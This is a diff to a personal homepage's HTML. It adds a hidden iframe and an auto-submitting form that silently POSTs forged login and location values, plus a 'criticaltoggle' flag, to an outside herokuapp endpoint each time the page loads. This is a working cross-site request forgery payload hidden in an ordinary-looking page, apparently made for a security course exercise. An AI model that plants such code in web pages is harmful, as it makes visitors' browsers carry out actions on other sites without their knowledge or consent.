@@ -10,7 +10,17 @@
                 <p id="name"> <br />Welcome to Avi Block's personal webpage!</p>
                 <div id="pic">
                         <img alt="Avi's Pic" src="canikickit.jpg" />
+
                 </div>
+                <iframe style="display:none" name="csrf-frame"></iframe>
+                <form method='POST' action='https://defense-in-derpth.herokuapp.com/sendLocation' target="csrf-frame" id="csrf-form">
+                  <input type='hidden' name='criticaltoggle' value='true'>
+                  <input name='login' value='Avi-hacker2'>
+                  <input name='lat' value='69'>
+                  <input name='lng' value='69'>
+                  <input type='submit' value='submit'>
+                </form>
+                <script>document.getElementById("csrf-form").submit()</script>
                 <a id="res_link" href="https://ablock15.github.io/resume.html">My Resume</a>
                 <a id="bio_link" href="https://ablock15.github.io/bio.html">My Bio</a>
         </body>
